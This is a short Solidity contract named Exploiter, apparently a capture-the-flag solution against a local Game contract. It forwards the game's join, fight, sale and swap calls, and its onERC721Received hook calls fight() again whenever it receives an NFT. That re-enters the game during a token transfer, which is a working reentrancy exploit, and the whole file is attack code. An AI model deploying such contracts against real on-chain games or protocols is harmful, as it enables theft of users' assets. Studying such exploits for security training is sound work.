// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import "./Game.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Exploiter is IERC721Receiver {
    Game game;

    constructor(Game _game) {
        game = _game;
    }

    function join() public {
        game.join();
    }

    function fight() public {
        game.fight();
    }

    function putUpForSale(uint256 _monId) external {
        game.putUpForSale(_monId);
    }

    function swap(address _to, uint256 _monId1, uint256 _monId2) external {
        game.swap(_to, _monId1, _monId2);
    }

    function swapForNewMon(uint256 _monId) external {
        game.swapForNewMon(_monId);
    }

    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external override returns (bytes4) {
        game.fight();
        return IERC721Receiver.onERC721Received.selector;
    }

}

